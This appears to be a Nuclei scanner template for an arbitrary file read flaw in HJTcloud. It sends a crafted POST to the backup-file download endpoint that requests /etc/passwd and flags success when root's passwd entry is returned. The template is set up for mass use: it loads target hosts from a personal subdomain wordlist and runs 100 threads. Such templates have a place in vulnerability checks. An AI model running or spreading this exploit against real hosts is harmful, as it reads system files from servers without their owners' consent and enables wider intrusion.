id: hjtcloud-arbitrary-file-read 1
info:
  author: pikpikcu
  name: HJTcloud Arbitrary File Read
  reference: https://mp.weixin.qq.com/s/w2pkj5ADN7b5uxe-wmfGbw
  severity: high
  tags: hjtcloud,lfi
requests:
- attack: sniper
  matchers:
  - regex:
    - 'root:.*:0:0:'
    type: regex
  - status:
    - 200
    type: status
  matchers-condition: and
  payloads:
    Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
  raw:
  - 'POST /fileDownload?action=downloadBackupFile HTTP/1.1

    Host: {{Subdomains}}

    Accept: application/json, text/plain, */*

    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
    like Gecko) Chrome/90.0.4430.212 Safari/537.36

    Content-Type: application/x-www-form-urlencoded; charset=UTF-8

    Content-Length: 20


    fullPath=/etc/passwd

    '
  threads: 100
